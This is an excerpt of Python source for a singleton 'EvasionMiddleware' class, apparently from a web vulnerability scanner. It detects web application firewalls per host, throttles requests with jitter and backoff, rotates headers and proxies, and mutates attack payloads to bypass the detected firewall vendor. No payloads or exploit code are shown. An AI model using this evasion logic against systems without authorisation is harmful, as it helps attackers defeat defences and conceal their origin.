class EvasionMiddleware:
    """
    Singleton middleware that:
      1. Optionally auto-detects WAF on first request to a new host
      2. Applies rate control (delay + jitter + backoff)
      3. Rotates headers (UA, Accept, language)
      4. Routes through proxies
      5. Observes responses and adapts

    Integrates into _http.py by wrapping the existing request() function.
    """

    _instance = None

    def __new__(cls, *args, **kwargs):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self, config: Optional[EvasionConfig] = None):
        if hasattr(self, "_initialized"):
            return
        self._initialized = True
        self.config = config or EvasionConfig()
        self.rate_controller = RateController(
            base_delay=self.config.base_delay,
            jitter_pct=self.config.jitter_pct,
            proxy_list=self.config.proxy_list,
        )
        self.mutator = PayloadMutator()
        self.detector = WAFDetector()
        self._waf_cache: Dict[str, WAFInfo] = {}  # host → WAFInfo
        self._lock = threading.Lock()

    @classmethod
    def reset(cls):
        cls._instance = None

    def get_waf_info(self, host: str) -> Optional[WAFInfo]:
        return self._waf_cache.get(host)

    def detect_waf_for_host(self, target_url: str) -> WAFInfo:
        """Run WAF detection and cache the result per host."""
        from urllib.parse import urlparse as _urlparse
        host = _urlparse(target_url).hostname or ""
        with self._lock:
            if host in self._waf_cache:
                return self._waf_cache[host]
        info = self.detector.detect(target_url)
        with self._lock:
            self._waf_cache[host] = info
        return info

    def prepare_request(
        self,
        url: str,
        headers: Optional[Dict[str, str]] = None,
    ) -> Tuple[Dict[str, str], Optional[Dict[str, str]]]:
        """
        Called before every HTTP request. Returns (merged_headers, proxies).
        Also sleeps for rate-controlled delay.
        """
        if not self.config.enabled or self.config.bypass_level == "none":
            return headers or {}, None

        # Rate-controlled delay with jitter
        self.rate_controller.pre_request_delay()

        # Header rotation
        rotated = self.rate_controller.get_rotated_headers()
        if headers:
            rotated.update(headers)

        # Proxy rotation
        proxies = self.rate_controller.get_next_proxy()

        return rotated, proxies

    def observe_response(self, response) -> None:
        """Feed response back to rate controller for adaptive behavior."""
        if self.config.enabled and self.config.bypass_level != "none":
            self.rate_controller.observe_response(response)

    def get_mutated_payloads(
        self,
        base_payloads: List[str],
        vuln_type: str,
        host: str = "",
        variants_per_payload: int = 4,
    ) -> List[Dict[str, str]]:
        """
        Expand a list of base payloads into mutated variants.
        Called by vulnerability detectors to get evasion-enhanced payloads.
        """
        if not self.config.enabled or self.config.bypass_level == "none":
            return [{"strategy": "original", "payload": p} for p in base_payloads]

        waf_info = self._waf_cache.get(host)
        waf_vendor = waf_info.vendor if waf_info else WAFVendor.UNKNOWN

        n = variants_per_payload
        if self.config.bypass_level == "light":
            n = min(variants_per_payload, 3)

        return self.mutator.mutate_batch(
            base_payloads, vuln_type, waf_vendor, variants_per_payload=n,
        )


